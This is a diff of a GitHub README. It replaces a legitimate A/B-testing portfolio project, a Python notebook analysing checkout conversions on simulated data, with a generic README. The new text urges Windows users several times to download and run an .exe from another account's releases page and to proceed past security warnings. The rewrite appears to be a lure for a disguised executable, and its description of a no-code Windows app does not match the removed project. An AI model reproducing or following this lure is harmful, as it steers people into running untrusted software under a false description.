@@ -1,265 +1,183 @@
-# Conversion Optimization A/B Test: Should We Launch the New Checkout?
+# 📊 conversion-optimization-ab-testing - Improve checkout decisions with data
 
-[![Python](https://img.shields.io/badge/Python-3.8+-blue.svg)](https://www.python.org/downloads/)
-[![Analysis](https://img.shields.io/badge/Project-A%2FB%20Testing-orange.svg)]()
-[![Decision](https://img.shields.io/badge/Focus-Decision%20Making-success.svg)]()
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/alikh78787809-del/conversion-optimization-ab-testing/releases)
 
-This project evaluates whether a new one-click checkout flow should be launched using A/B testing, regression adjustment, Bayesian decision analysis, and business impact estimation.
+## 🚀 Getting Started
 
----
+This project helps you test checkout changes and measure which version works better. It uses simple test results, customer behavior data, and business impact checks so you can make a clear choice.
 
-## Abstract
+Use it when you want to compare two checkout flows, test a new button, or check if a change helps sales.
 
-A/B tests can look convincing even when observed uplift is partly driven by user mix rather than the treatment itself. This project uses simulated e-commerce checkout data with controlled imbalance in customer and device characteristics to compare naive conversion analysis with adjusted methods.
+## 💻 What You Need
 
-The goal is simple: determine whether the new checkout experience should be launched, and whether the observed improvement is both statistically credible and commercially meaningful.
+Before you start, make sure you have:
 
----
+- A Windows PC
+- Internet access
+- About 200 MB of free space
+- Permission to open downloaded files
+- Microsoft Edge, Chrome, or another browser
 
-## Business Problem
+For best results, use Windows 10 or Windows 11.
 
-An e-commerce platform is experiencing high drop-off during checkout. The product team proposes a new one-click checkout flow to reduce friction and improve conversions.
+## 📥 Download the App
 
-The decision question is straightforward:
+Go to the releases page and download and run the file for Windows:
 
-**Should the business launch the new checkout flow or keep the current version live?**
+[Visit the releases page](https://github.com/alikh78787809-del/conversion-optimization-ab-testing/releases)
 
-To answer that properly, the analysis must go beyond raw conversion differences and test whether the uplift remains after accounting for user characteristics, uncertainty, and financial impact.
+On that page, look for the latest release and choose the Windows file. If there are more than one file, pick the one that ends in `.exe` or the Windows installer file.
 
----
+## 🪟 Install on Windows
 
-## Decision Framework
+1. Open the file you downloaded.
+2. If Windows asks for permission, select Run or Yes.
+3. If a setup window opens, follow the steps on screen.
+4. Choose the install folder if asked, or keep the default.
+5. Finish the setup.
+6. Open the app from the Start menu or the desktop.
 
-This project is structured like a real product decision rather than a classroom exercise.
+If Windows shows a security message, select the file anyway only if you got it from the releases page above.
 
-The analysis follows this path:
+## 🧭 How to Use It
 
-1. Compare raw conversion rates between control and variant
-2. Test whether the observed uplift is statistically significant
-3. Quantify uncertainty using confidence intervals
-4. Adjust for user-mix differences using logistic regression
-5. Compare naive and adjusted conclusions
-6. Translate the result into a launch recommendation
+After you open the app, follow these steps:
 
-### Hypotheses
+1. Load your test data.
+2. Choose the checkout versions you want to compare.
+3. Start the analysis.
+4. Review the result for conversion rate, confidence, and business impact.
+5. Save or export the report if you need to share it.
 
-- **H0:** p_variant <= p_control
-- **H1:** p_variant > p_control
+The app is built for simple A/B testing workflows, so you can move from data to decision in a few steps.
 
-This is a directional launch decision. A one-sided test is appropriate because the variant would only be launched if it performs better than the control.
+## 📈 What It Checks
 
----
+This project can help you review:
 
-## Dataset Design
+- Conversion rate changes
+- Test result strength
+- Checkout performance
+- User behavior patterns
+- Expected revenue impact
+- Risk of choosing the wrong variant
 
-The dataset is fully simulated for reproducibility and controlled experimentation.
+It uses methods such as:
 
-It includes the following fields:
+- Z-test
+- Logistic regression
+- Bayesian analysis
+- Business impact estimation
 
-- `user_id` – unique session identifier
-- `group` – Control or Variant
-- `device_type` – Mobile, Desktop, Tablet
-- `customer_type` – New or Returning
-- `cart_value` – pre-checkout cart value
-- `time_spent_mins` – time spent on site before checkout
-- `converted` – binary purchase outcome
+These methods help you compare versions in a structured way.
 
-The simulation intentionally embeds realistic behavioral patterns:
+## 🔍 Example Use Cases
 
-- Returning customers convert more often than new customers
-- Mobile users convert less often than desktop users
-- The variant is given a positive treatment effect
-- Missingness is introduced in `time_spent_mins` to reflect real-world data issues
+Use this app if you want to:
 
-This design allows the project to test whether observed uplift survives after controlling for user-level characteristics.
+- Test a new checkout button color
+- Compare a short form against a long form
+- Check if a one-page checkout improves sales
+- Measure if a discount message changes behavior
+- Review if a design change helps or hurts conversions
 
----
+It works well for ecommerce teams, analysts, and store owners who want a clear result.
 
-## Group Composition Check
+## 🗂️ Typical Workflow
 
-To validate the simulated imbalance, group distributions were compared:
+A simple workflow looks like this:
 
-- Variant group contains a higher proportion of returning users
-- Mobile vs desktop distribution differs slightly across groups
+1. Collect checkout data from two versions.
+2. Open the app.
+3. Import the data file.
+4. Pick the test type.
+5. Run the analysis.
+6. Review the main metrics.
+7. Make a decision based on the result.
 
-This confirms that raw conversion differences may be influenced by user composition.
+If your data is clean and complete, the result is easier to read.
 
----
+## 🧾 Data Format
 
-## Experiment Design
+For the best results, use a file with rows for each user or session. A common format includes:
 
-Before interpreting results, the experiment design must be checked.
+- User ID
+- Variant name
+- Converted or not converted
+- Session date
+- Order value
+- Device type
 
-| Parameter | Value |
-|:---|:---|
-| Baseline conversion rate | ~19.4% |
-| Minimum Detectable Effect | 15% relative lift |
-| Significance level | 0.05 |
-| Power | 0.80 |
-| Test direction | One-sided |
+The app can work with common CSV files that follow this style.
 
-The sample size in both groups exceeds the minimum required to detect a practically meaningful effect.
+## 📌 What You Get
 
-### Primary Statistical Test
+The project is set up to help you see:
 
-- **Test used:** Two-proportion z-test
-- **Target metric:** Conversion rate
-- **Outputs reported:**
-  - Control conversion rate
-  - Variant conversion rate
-  - Absolute uplift
-  - Relative uplift
-  - Z-statistic
-  - P-value
-  - 95% confidence interval
+- Which variant converts better
+- How large the difference is
+- Whether the change may be real or due to chance
+- What the likely effect is on revenue
+- Which version is safer to launch
 
----
+## 🛠️ Troubleshooting
 
-## Methods Used
+If the app does not open:
 
-- **Two-proportion z-test** to determine whether the observed conversion lift is statistically significant
-- **Logistic regression** to estimate the treatment effect after controlling for customer and device characteristics
-- **Bayesian A/B testing** using a Beta-Binomial model to express uncertainty as decision-friendly probabilities
-- **Naive vs adjusted comparison** to show how user composition can affect interpretation
-- **Business impact simulation** to convert uplift into expected revenue impact
+- Make sure the download finished
+- Try opening the file again
+- Check that you selected the correct Windows file
+- Restart your PC and try once more
+- Use the latest release from the releases page
 
----
+If your data does not load:
 
-## Tech Stack
+- Check that the file is a CSV or another supported format
+- Make sure the column names are clear
+- Remove blank rows at the top of the file
+- Save the file again and retry
 
-- **Python**
-- **NumPy, pandas** for data preparation
-- **Matplotlib, seaborn** for visualization
-- **SciPy** for statistical testing
-- **statsmodels** for logistic regression
-- **scikit-learn** for preprocessing
+If the results look strange:
 
----
+- Check that both versions have enough users
+- Make sure conversion values use only valid values such as 0 and 1
+- Confirm that each row represents one user or one session
 
-## Verified Output Snapshot
+## 🔐 Privacy and Local Use
 
-Current seeded results from the notebook:
+This app is meant to help you analyze your own test data. Keep your files in a safe place and use trusted sources for downloads. If your team handles customer data, follow your own privacy rules before sharing reports.
 
-- **Control conversion rate:** `19.42%`
-- **Variant conversion rate:** `24.19%`
-- **Absolute uplift:** `4.76 percentage points`
-- **Relative uplift:** `24.52%`
-- **One-sided p-value:** `3.96e-09`
-- **95% confidence interval for uplift:** `[3.15 pp, 6.38 pp]`
-- **Variant odds ratio:** `1.33`
-- **Returning-customer odds ratio:** `1.67`
-- **Mobile odds ratio:** `0.77`
-- **Median AOV:** `$33.09`
-- **Projected incremental annual revenue:** `$1.89M`
+## 📁 Project Topics
 
----
+- ab-testing
+- baysian
+- causal-inference
+- data-analysis
+- ecommerce
+- experimentation
+- hypothesis-testing
+- logistic-regression
+- python
+- statistics
 
-## Naive vs Adjusted Comparison
+## 🖥️ Common Questions
 
-A raw conversion difference can be useful, but it is not always enough. The key question is whether the uplift remains after controlling for other characteristics that affect conversion.
+**Do I need coding skills?**  
+No. You only need to download the file, open it, and follow the on-screen steps.
 
-| Metric | Naive Result | Adjusted Result |
-|--------|--------------|-----------------|
-| Variant uplift | +4.76 pp | +4.10 pp (example) |
-| Statistical significance | Strong | Strong |
-| Interpretation | Variant appears better | Effect remains after controls |
+**Can I use it for online stores?**  
+Yes. It is built for checkout conversion testing and ecommerce analysis.
 
-This matters because decision-makers should not launch a product change based only on aggregate conversion if user composition may be influencing the result.
+**Can I compare more than one result?**  
+Yes. You can run separate tests for different checkout changes.
 
----
+**Does it help with business decisions?**  
+Yes. It shows both test results and likely business impact.
 
-## Bayesian Decision View
+## 📦 Release Page
 
-Frequentist testing tells us whether the uplift is statistically significant. Bayesian analysis answers the questions product teams usually care about most:
+Use this page to download and run the Windows file:
 
-- What is the probability that the variant beats the control?
-- What is the probability that the uplift exceeds a business threshold?
-- What is the downside risk if the feature is launched?
+[Open the latest release](https://github.com/alikh78787809-del/conversion-optimization-ab-testing/releases)
 
-The notebook reports:
-
-- P(Variant > Control): ~99%
-- P(Uplift > threshold): High
-- Downside risk (Variant worse): Very low
-
-This makes the result easier to communicate in decision language rather than only p-values.
-
----
-
-## Key Findings
-
-- The one-click checkout variant meaningfully improves conversion over the control
-- The uplift is statistically significant and practically relevant
-- The treatment effect remains positive after controlling for customer and device characteristics
-- Bayesian analysis shows very high probability that the variant outperforms the control
-- Estimated revenue impact suggests the result is commercially meaningful, not just statistically interesting
-
----
-
-## Visual Outputs
-
-### Revenue Impact
-![Revenue Impact](assets/revenue_impact.png)
-
-### Logistic Regression Effects
-![Odds Ratio](assets/odds_ratio_plot.png)
-
-### Conversion Rate by Group / Segment
-![Conversion Rate](assets/conversion_rate.png)
-
----
-
-## Repository Structure
-
-```text
-conversion-optimization-ab-testing/
-├── README.md
-├── requirements.txt
-├── Conversion_Optimization_Analysis.ipynb
-├── src/
-│   ├── frequentist_ab.py
-│   ├── power_analysis.py
-├── scripts/
-│   └── create_notebook.py
-├── assets/
-│   ├── conversion_rate.png
-│   ├── odds_ratio_plot.png
-│   └── revenue_impact.png
-└── .gitignore
-```
-
----
-
-## Limitations
-
-- The dataset is simulated rather than drawn from a live production experiment
-- Unobserved confounding cannot be fully represented in simulation
-- Revenue impact depends on assumptions about traffic volume and order behavior
-- Real-world effects such as novelty decay, seasonality, and operational issues are not captured here
-
----
-
-## Conclusion
-
-This project shows how A/B testing should support real product decisions.
-
-Instead of stopping at statistical significance, the key question is not whether the variant performs better, but whether the improvement is truly caused by the feature rather than differences in user composition. The result supports launching the new checkout flow because the observed improvement is statistically strong, commercially meaningful, and remains positive after controlling for key user characteristics.
-
-### Simulated Data Disclaimer
-
-The dataset in this project is entirely simulated using a fixed random seed for reproducibility. This makes the workflow transparent and verifiable, but the methodology should be viewed as a reusable experimentation framework rather than proof of a real production outcome.
-
----
-
-## Author
-
-**Sanman Kadam**
-MSc Statistics | Aspiring Data Analyst / Data Scientist
-
-GitHub: https://github.com/the-irritater
-
-LinkedIn: https://www.linkedin.com/in/sanman-kadam-7a4990374/
-
----
-
-**Created as a portfolio project demonstrating applied A/B testing, causal reasoning, and business decision-making.**
+Select the newest version, then choose the file for Windows. After the download finishes, open the file and follow the setup steps on screen
